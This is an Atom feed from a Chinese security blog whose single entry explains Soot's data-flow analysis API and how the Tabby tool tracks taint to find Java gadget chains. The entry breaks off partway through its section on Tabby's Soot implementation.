<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>m0d9&#39;s blog</title>
  
  
  <link href="http://m0d9.me/atom.xml" rel="self"/>
  
  <link href="http://m0d9.me/"/>
  <updated>2022-10-27T02:00:50.693Z</updated>
  <id>http://m0d9.me/</id>
  
  <author>
    <name>m0d9</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Tabby 源码分析</title>
    <link href="http://m0d9.me/2022/10/22/Tabby-%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2022/10/22/Tabby-%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/</id>
    <published>2022-10-22T08:27:00.000Z</published>
    <updated>2022-10-27T02:00:50.693Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>与GadgetInspector 类似，Tabby 也是通过污点分析来实现的Gadget Chain挖掘。不同的是</p><ul><li>Tabby 用soot 来做的静态污点分析，GadgetInspector 是用的ASM 模拟来做的污点跟踪</li><li>用了Neo4j来做CPG 的查询与展示，要灵活很多</li><li>优化了污点传播关系</li></ul><p>据说Tabby 一开始是wh1t3p1g师傅的毕设，不过当时没放出tabby-path-finder，因此一直没太关注Tabby 污点分析这块，都是用手动白名单来做过滤的。KCon上师傅的PPT，收获很多，学习总结下。这里主要关注</p><ol><li>Tabby 污点传播规则</li><li>Tabby soot 污点分析的实现</li><li>Tabby Neo4j 搜索实现</li></ol><p>注：本文需要对soot 有一定了解，参考fynch3r 师傅的参考【3】。</p><h2 id="0x02-Soot-数据流分析"><a href="#0x02-Soot-数据流分析" class="headerlink" title="0x02 Soot 数据流分析"></a>0x02 Soot 数据流分析</h2><p>四步走：</p><p><img src="/images/pasted-320.png" alt="upload successful"></p><a id="more"></a><p>具体实现：</p><p><img src="/images/pasted-322.png" alt="upload successful"></p><ul><li>必须继承FlowAnalysis抽象类</li><li>实现抽象方法 merge() and copy()</li><li>实现数据流分析函数：flowThrough()</li><li>实现初始化函数：newInitialFlow() and entryInitialFlow()</li><li>框架的构造函数内必须调用 doAnalysis()</li></ul><p>必备知识：</p><ul><li>UnitGraph 是语句图，结点是Units。</li><li>BlockGraph 是基本控制流图，结点由基本块BasicBlocks组成。</li></ul><h3 id="2-1-FlowSet"><a href="#2-1-FlowSet" class="headerlink" title="2.1 FlowSet"></a>2.1 FlowSet</h3><p>在soot中，flow sets 代表control-flow-graph 中与节点相关的数据集合。</p><p>CFG中的每个节点，都有一个flowset与之关联。</p><ul><li>有边界：需要实现BoundedFlowSet接口，知道所有可能值，适合指针分析</li><li>无边界：需要实现FlowSet接口，不知道所有可能值</li></ul><h4 id="2-1-1-接口"><a href="#2-1-1-接口" class="headerlink" title="2.1.1 接口"></a>2.1.1 接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FlowSet&lt;T&gt; <span class="title">clone</span><span class="params">()</span></span>; <span class="comment">//克隆当前FlowSet的集合</span></span><br><span class="line"><span class="function">FlowSet&lt;T&gt; <span class="title">emptySet</span><span class="params">()</span></span>;<span class="comment">//返回一个空集，通常比((FlowSet)clone()).clear()效率更高</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy</span><span class="params">(FlowSet&lt;T&gt; dest)</span></span>;<span class="comment">//拷贝当前集合到dest集合中</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span>;<span class="comment">//返回该flowset的清空</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">union</span><span class="params">(FlowSet&lt;T&gt; other)</span></span>; <span class="comment">//并集，this = this ∪nion</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">union</span><span class="params">(FlowSet&lt;T&gt; other, FlowSet&lt;T&gt; dest)</span></span>; <span class="comment">// this ∪ other = dest，其中other、dest可以与该FlowSet一样</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">intersection</span><span class="params">(FlowSet&lt;T&gt; other)</span></span>; <span class="comment">//交集，this ∩ other = this</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">intersection</span><span class="params">(FlowSet&lt;T&gt; other, FlowSet&lt;T&gt; dest)</span></span>; <span class="comment">//FlowSet ∩ other = dest 其中，dest、other可以和该FlowSet一样</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">difference</span><span class="params">(FlowSet&lt;T&gt; other)</span></span>; <span class="comment">// 排除，this = this - other</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">difference</span><span class="params">(FlowSet&lt;T&gt; other, FlowSet&lt;T&gt; dest)</span></span>; <span class="comment">// this - other = dest,其中，dest、other和FlowSet可能相同。</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(T var1)</span></span>; <span class="comment">// 添加元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(T obj, FlowSet&lt;T&gt; dest)</span></span>; <span class="comment">// 添加元素至dest</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">(T var1)</span></span>;<span class="comment">// 删除元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">(T obj, FlowSet&lt;T&gt; dest)</span></span>; <span class="comment">// dest删除</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(T var1)</span></span>;<span class="comment">// </span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isSubSet</span><span class="params">(FlowSet&lt;T&gt; var1)</span></span>; <span class="comment">//</span></span><br><span class="line"><span class="function">Iterator&lt;T&gt; <span class="title">iterator</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">List&lt;T&gt; <span class="title">toList</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><h4 id="2-1-2-实现"><a href="#2-1-2-实现" class="headerlink" title="2.1.2 实现"></a>2.1.2 实现</h4><ul><li><p>ArraySparseSet 无边界<br>  该set代表一个数组引用<br>  注意：当比较元素是否相等时，一般使用继承自Object对象的equals。但是在soot中的元素都是代表一些代码结构，不能覆写equals方法。而是实现了interface soot.EquivTo。因此，如果你需要一个包含类似binary operation expressions的集合，你需要使用equivTo方法实现自定义的比较方法去比较是否相等。</p></li><li><p>ArrayPackedSet 有边界<br>  需要提供FlowUniverse 对象，即代表全集的容器。由一个在integer和object双向map和一个用来表示全集成员是否在内的bit vector表示。</p></li><li><p>ToppedSet<br>  在基于上面两种的set前提下，加入额外信息来表示其为lattice中的Top。</p></li><li><p>DavaFlowSet</p></li></ul><p><img src="/images/pasted-325.png" alt="upload successful"></p><h3 id="2-2-FlowAnalysis"><a href="#2-2-FlowAnalysis" class="headerlink" title="2.2 FlowAnalysis"></a>2.2 FlowAnalysis</h3><p>FlowAnalysis是接口类，具体有以下实现：</p><ul><li>ForwardFlowAnalysis：正向传播，也即以UnitGraph的entry statement作为开始并开始传播；</li><li>BackwardsFlowAnalysis：反向传播，以UnitGraph的exit node(s)作为分析并且向后开始传播（当然可以将UnitGraph转换产生inverseGraph，然后再使用ForwardFlowAnalysis进行分析）；</li><li>ForwardBranchedFlowAnalysis：分支正常传播，本质上也是Forward分析，但是它允许你在不同分支处传递不同的flow sets。例如：如果传播到如if(p!=null)语句处，当“p is not null”时，传播进入“then”分支，当“p is null”时传播进入“else”分支（Forward、backward分析都在分支处会将分析结果merge合并掉）。</li></ul><h4 id="2-2-1-构造函数"><a href="#2-2-1-构造函数" class="headerlink" title="2.2.1 构造函数"></a>2.2.1 构造函数</h4><p>必须实现一个携带DirectedGraph作为参数的构造函数，并且将该参数传递给super constructor。然后，在构造函数结束时调用doAnalysis()，doAnalysis()将真正执行数据流分析。而在调用super constructor和doAnalysis之间，可以自定义数据分析结构。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MyAnalysis</span><span class="params">(DirectedGraph graph)</span> </span>&#123; <span class="comment">//构造函数</span></span><br><span class="line"><span class="keyword">super</span>(graph);<span class="comment">//传递给父类</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">emptySet = <span class="keyword">new</span> ArraySparseSet();<span class="comment">//自定义分析</span></span><br><span class="line">  </span><br><span class="line">doAnalysis();<span class="comment">//执行fixed-point</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-2-newInitialFlow-and-entryInitialFlow"><a href="#2-2-2-newInitialFlow-and-entryInitialFlow" class="headerlink" title="2.2.2 newInitialFlow() and entryInitialFlow()"></a>2.2.2 newInitialFlow() and entryInitialFlow()</h4><p>newInitialFlow()方法返回一个抽象类型A的对象，这个对象被赋值给每个语句的in-set和out-set集合，除过UnitGraph的第一个句子的in-set集合（如果你实现的是backwards分析，则是除去exit statement语句）。第一个句子的in-set集合由entryInitialFlow()初始化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">newInitialFlow</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">return</span> emptySet.emptySet();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">entryInitialFlow</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">return</span> emptySet.emptySet();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-3-copy"><a href="#2-2-3-copy" class="headerlink" title="2.2.3 copy()"></a>2.2.3 copy()</h4><p>集合复制，方法接收两个A类型的参数，分别是source和target，该方法其实就是把source复制到target集合里面。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">copy</span><span class="params">(Object source, Object dest)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">FlowSet srcSet = (FlowSet)source,</span><br><span class="line">FlowSet destSet = (FlowSet)dest;</span><br><span class="line">srcSet.copy(destSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-329.png" alt="upload successful"></p><p>Soot 指导文档的这个能更好的理解copy 和merge 的功能，以backforward may analysis 场景为例：</p><ul><li>copy 是指：在无分枝情况下，上一个节点的src 就是下一个节点的dest</li><li>merge是指：有分支情况下，下一个节点的merge，是前连个节点的交集</li></ul><h4 id="2-2-4-merge"><a href="#2-2-4-merge" class="headerlink" title="2.2.4 merge()"></a>2.2.4 merge()</h4><p>交汇运算，方法被用来在control-flow的合并点处合并数据流集，例如：在句子(if/then/else)分支的结束点。与copy(..)不同的是，它携带了三个参数，一个参数是来自左边分支的out-set，一个参数是来自右边分支的out-set，另外一个参数是两个参数merge后的集合，这个集合将是合并点的下一个句子的in-set集合。</p><p>注：merge(..)本质上指的是控制流的交汇运算，一般根据待分析的具体问题来决定采用并集还是交集。</p><blockquote><p>分析的精度是由每一个最小执行单元决定的。通常来讲，一个分析只可能是may analysis或者 must analysis。在may analysis场景下，我们对两个元素进行union操作，在must analysis场景下，我们进行取交集intersection 操作。在数据流分析框架中，这种关系我们用<strong>merge</strong> 接口来实现。如果是must analysis，那么我们这么表示：</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(Object in1, Object in2, Object out)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">FlowSet inSet1 = (FlowSet)in1,</span><br><span class="line">inSet2 = (FlowSet)in2,</span><br><span class="line">outSet = (FlowSet)out;</span><br><span class="line"><span class="comment">//inSet1.union(inSet2, outSet);</span></span><br><span class="line">inSet1.intersection(inSet2, outSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-5-flowThrough"><a href="#2-2-5-flowThrough" class="headerlink" title="2.2.5 flowThrough()"></a>2.2.5 flowThrough()</h4><p>flowThrough 是数据流分析的最重点内容</p><p>flowThrough(..)方法是真正的执行流函数，它有三个参数：A in-set、被处理的N类型节点（一般指的就是句子Unit）、A out-set。这个方法的实现内容完全取决于你的分析。</p><p>注：flowThrough()本质上就是一个传递函数。在一个语句之前和之后的数据流值受该语句的语义的约束。比如，假设我们的数据流分析涉及确定各个程序点上各变量的常量值。如果变量a在执行语句b=a之前的值为v，那么在该语句之后a和b的值都是v。一个赋值语句之前和之后的数据流值的关系被称为传递函数。针对前向分析和后向分析，传递函数有两种风格。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">flowThrough</span><span class="params">(Object in, Object d, Object out)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">FlowSet inSet = (FlowSet)in,</span><br><span class="line">FlowSet outSet = (FlowSet)out;</span><br><span class="line">Unit u = (Unit) d;</span><br><span class="line">kill(inSet,u,outSet);</span><br><span class="line">gen(outSet,u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-331.png" alt="upload successful"></p><p><img src="/images/pasted-330.png" alt="upload successful"></p><ul><li>kill 指需要在传播关系中，舍弃的</li><li>gen 指需要在传播关系中，新增的</li></ul><h3 id="2-3-Demo-Live-Variables-Analysis-实时变量分析"><a href="#2-3-Demo-Live-Variables-Analysis-实时变量分析" class="headerlink" title="2.3 Demo: Live Variables Analysis 实时变量分析"></a>2.3 Demo: Live Variables Analysis 实时变量分析</h3><p>《软件分析》课程中有讲Live Variables Analysis。</p><blockquote><p>Live variables analysis tells whether the value of variable v at program point p could be used along some path in CFG starting at p. If so, v is live at p; otherwise, v is dead at p.<br>实时变量分析，是用来计算“程序点p”处的“变量v”的值，是否可以从p开始，沿着CFG到达exit。如果可以，那么“变量v”对于p来说是可变变量的；否则，是不可变。</p></blockquote><p>核心问题是在p -&gt; use(v) 中，有没有被重新定义。</p><p><img src="/images/pasted-324.png" alt="upload successful"></p><p>算法如下：</p><p><img src="/images/pasted-323.png" alt="upload successful"></p><h4 id="2-3-1-FlowSet-设定"><a href="#2-3-1-FlowSet-设定" class="headerlink" title="2.3.1 FlowSet 设定"></a>2.3.1 FlowSet 设定</h4><p>参考fynch3r的实现LiveVariableFlowSet，继承关系 -&gt; AbstractBoundedFlowSet -&gt; AbstractFlowSet</p><p><strong>AbstractBoundedFlowSet</strong><br>AbstractBoundedFlowSet 相较于AbstractFlowSet 实现了BoundedFlowSet 的几个接口方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">complement</span><span class="params">()</span></span>;<span class="comment">// 补充</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">complement</span><span class="params">(FlowSet&lt;T&gt; dest)</span></span>;<span class="comment">//补充</span></span><br><span class="line"><span class="function">FlowSet&lt;T&gt; <span class="title">topSet</span><span class="params">()</span></span>;<span class="comment">// 全集</span></span><br></pre></td></tr></table></figure><p><strong>LiveVariableFlowSet</strong></p><p>就是简单的HashSet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LiveVariableFlowSet</span> <span class="keyword">extends</span> <span class="title">AbstractBoundedFlowSet</span>&lt;<span class="title">Local</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Set&lt;Local&gt; liveVariableSet = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br></pre></td></tr></table></figure><h4 id="2-3-2-FlowAnalysis-设定"><a href="#2-3-2-FlowAnalysis-设定" class="headerlink" title="2.3.2 FlowAnalysis 设定"></a>2.3.2 FlowAnalysis 设定</h4><p>参考fynch3r的实现SimpleLiveVariablesAnalysis, extends BackwardFlowAnalysis&lt;Unit, LiveVariableFlowSet&gt;</p><ul><li>BackwardFlowAnalysis，逆向分析</li><li>Unit，语句图</li><li>LiveVariableFlowSet，指定前文的FlowSet</li></ul><p><strong>entryInitialFlow</strong></p><p><img src="/images/pasted-328.png" alt="upload successful"></p><p><strong>newInitialFlow</strong></p><p><img src="/images/pasted-327.png" alt="upload successful"></p><p><strong>copy</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// copy</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">copy</span><span class="params">(LiveVariableFlowSet srcSet, LiveVariableFlowSet destSet)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//backward copy</span></span><br><span class="line">    srcSet.copy(destSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>merge</strong><br><img src="/images/pasted-332.png" alt="upload successful"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// merge</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(LiveVariableFlowSet srcSet1, LiveVariableFlowSet srcSet2, LiveVariableFlowSet destSet)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// srcSet1 U srcSet2 = srcSet2</span></span><br><span class="line">    srcSet1.union(srcSet2,destSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>** 注意 **<br>fynch3r 师傅MySootScript 项目里面代码是srcSet1.union(srcSet2,srcSet2)，blog上是srcSet1.union(srcSet2,destSet)，理解应该是后者。</p></blockquote><p><strong>flowThrough</strong><br><img src="/images/pasted-333.png" alt="upload successful"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">flowThrough</span><span class="params">(LiveVariableFlowSet srcSet, Unit u, LiveVariableFlowSet destSet)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//transfer function</span></span><br><span class="line">    <span class="comment">// 1.1 kill leftOp</span></span><br><span class="line">    kill(srcSet,u,destSet);</span><br><span class="line">    <span class="comment">// 1.2 gen rightOps</span></span><br><span class="line">    gen(u,destSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>kill</strong><br>对于Live Variable 而言，kill则是判断当前u 是否有新定义var，针对每一个新定义的var，并将其在inSet中剔除，赋予destSet。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">kill</span><span class="params">(LiveVariableFlowSet inSet, Unit u, LiveVariableFlowSet destSet)</span> </span>&#123;</span><br><span class="line">    LiveVariableFlowSet kills = <span class="keyword">new</span> LiveVariableFlowSet();</span><br><span class="line">    Iterator&lt;ValueBox&gt; defIt = u.getDefBoxes().iterator();</span><br><span class="line">    <span class="keyword">while</span>(defIt.hasNext())&#123;</span><br><span class="line">        ValueBox defBox = defIt.next();</span><br><span class="line">        defBox.getValue().apply(<span class="keyword">new</span> AbstractJimpleValueSwitch() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseLocal</span><span class="params">(Local v)</span> </span>&#123;</span><br><span class="line">                Iterator inIt = inSet.iterator();</span><br><span class="line">                <span class="keyword">while</span>(inIt.hasNext())&#123;</span><br><span class="line">                    Local inValue = (Local)inIt.next();</span><br><span class="line">                    <span class="keyword">if</span>(inValue.equivTo(defBox.getValue()))&#123;</span><br><span class="line">                        kills.add((Local) defBox.getValue());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// inSet - kills = destSet</span></span><br><span class="line">    inSet.difference(kills,destSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>gen</strong><br>对于Live Variable 而言，gen则是判断当前unit 是否有新定义var，并增加。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">gen</span><span class="params">(Unit u, LiveVariableFlowSet destSet)</span> </span>&#123;</span><br><span class="line">    Iterator&lt;ValueBox&gt; it = u.getUseBoxes().iterator();</span><br><span class="line">    <span class="keyword">while</span>(it.hasNext())&#123;</span><br><span class="line">        ValueBox useBox = it.next();</span><br><span class="line">        useBox.getValue().apply(<span class="keyword">new</span> AbstractJimpleValueSwitch() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseLocal</span><span class="params">(Local v)</span> </span>&#123;</span><br><span class="line">                destSet.add((Local) useBox.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-Tabby-FlowAnalysis"><a href="#0x03-Tabby-FlowAnalysis" class="headerlink" title="0x03 Tabby FlowAnalysis"></a>0x03 Tabby FlowAnalysis</h2><h3 id="3-1-Tabby的污点传播"><a href="#3-1-Tabby的污点传播" class="headerlink" title="3.1 Tabby的污点传播"></a>3.1 Tabby的污点传播</h3><p>GadgetInspector中有提到，针对方法 <code>r = o.m(p0,…)</code>，GI只考虑了r返回值的受污点情况。</p><p>而实际场景下，污点还可能传播至其他的地方，比如</p><ul><li>o，也就是this</li><li>p，参数自身</li></ul><p>这些在GI中都没有考虑，Wh1t3p1g师傅也提到了</p><p><img src="/images/pasted-334.png" alt="upload successful"></p><p>针对这种情况，改进了污点传播算法，以支持对参数P的污染跟踪</p><h4 id="3-1-1-Passthrough-的改造"><a href="#3-1-1-Passthrough-的改造" class="headerlink" title="3.1.1 Passthrough 的改造"></a>3.1.1 Passthrough 的改造</h4><p>每个方法的污点传播不只是针对ret值的传播，还支持参数的传播，例如</p><p><img src="/images/pasted-336.png" alt="upload successful"></p><h5 id="action"><a href="#action" class="headerlink" title="action"></a>action</h5><p>对应于GI的passthrough 污点表示，tabby引入了action概念，eg</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">actions &#123;</span><br><span class="line"><span class="string">&quot;param-0&quot;</span>: [<span class="string">&quot;param-1&quot;</span>],</span><br><span class="line"><span class="string">&quot;param-1&quot;</span>: [<span class="string">&quot;param-0&quot;</span>],</span><br><span class="line"><span class="string">&quot;return&quot;</span>: [<span class="string">&quot;param-0&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应GI，passthrough中对应的是</p><table><thead><tr><th>字段</th><th>Demo</th></tr></thead><tbody><tr><td>方法名</td><td>swap</td></tr><tr><td>污点</td><td>1</td></tr></tbody></table><p><img src="/images/pasted-338.png" alt="upload successful"></p><p>注：这个图并不是swap方法的污点结果。Tabby针对obj，还解析了特定field，以达到更高精度的污点跟踪</p><h5 id="action传播"><a href="#action传播" class="headerlink" title="action传播"></a>action传播</h5><p><img src="/images/pasted-337.png" alt="upload successful"></p><!-- 师傅这里的copy其实是soot的概念，其实有了以上soot的了解，这里不难理解，顺序传播的话，指的就是下一个OUT 是上一个IN的关系--><p>这里污点参数a0，经过swap的传播action，结果是[a1, a2] 被污染。</p><p><img src="/images/pasted-349.png" alt="upload successful"></p><h4 id="3-1-2-CallGraph-的改造"><a href="#3-1-2-CallGraph-的改造" class="headerlink" title="3.1.2 CallGraph 的改造"></a>3.1.2 CallGraph 的改造</h4><p>同样，有了passthrough 之后，需要生成调用边的污点传播关系，Tabby同样改进了传播边的污点表示。</p><p><img src="/images/pasted-350.png" alt="upload successful"></p><p>注：在GI中，passthrough 和 callgraph的污点表示都是用0-n表示</p><table><thead><tr><th>可控性标志</th><th>意义</th><th>备注</th></tr></thead><tbody><tr><td>-3</td><td>变量不可控</td><td>新增</td></tr><tr><td>-2</td><td>变量来源于sources</td><td>新增</td></tr><tr><td>-1</td><td>变量来源于调用者本身</td><td>GI中为0</td></tr><tr><td>0-n</td><td>变量来源于参数函数列表</td><td>GI中为1-n</td></tr></tbody></table><h5 id="GI的表示"><a href="#GI的表示" class="headerlink" title="GI的表示"></a>GI的表示</h5><p>在GI中，callgraph最终生成的是参数的污点传播关系。</p><p><img src="/images/pasted-339.png" alt="upload successful"></p><p><img src="/images/pasted-340.png" alt="upload successful"></p><p>比如，以下例子表示的是调用invokeCall过程中，污点参数是由 0传递给了 0和1，共2条记录</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AbstractTableModel</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;String, IFn&gt; __clojureFnMap;</span><br><span class="line">    hashCode() &#123;</span><br><span class="line">        IFn f = __clojureFnMap.get(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.invokeCall(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以表示为AbstractTableModel#hashCode到IFn#invokeCall的传播关系为 0-&gt;0，0-&gt;1</p><h5 id="Tabby的表示"><a href="#Tabby的表示" class="headerlink" title="Tabby的表示"></a>Tabby的表示</h5><p>从Tabby的PPT来看，tabby把调用边上的传播表达改为固定格式</p><p><img src="/images/pasted-341.png" alt="upload successful"></p><ul><li>第一位表示obj</li><li>第二位开始，表示参数0-n</li></ul><p>以上的Tabby记录[-3,-1,-3]，可以翻译成GI的传播规则：</p><p>0-&gt;1</p><p>同样的，GI的规则0-&gt;0，0-&gt;1,也可以翻译成tabby的这种表达：</p><p>[-1,-1]</p><blockquote><p>** 疑问 **<br>这种表达方式有什么优势？增加的-3、-2有何作用？</p></blockquote><h3 id="3-2-Tabby的Soot实现"><a href="#3-2-Tabby的Soot实现" class="headerlink" title="3.2 Tabby的Soot实现"></a>3.2 Tabby的Soot实现</h3><p>具体的Passthrough/CallGraph 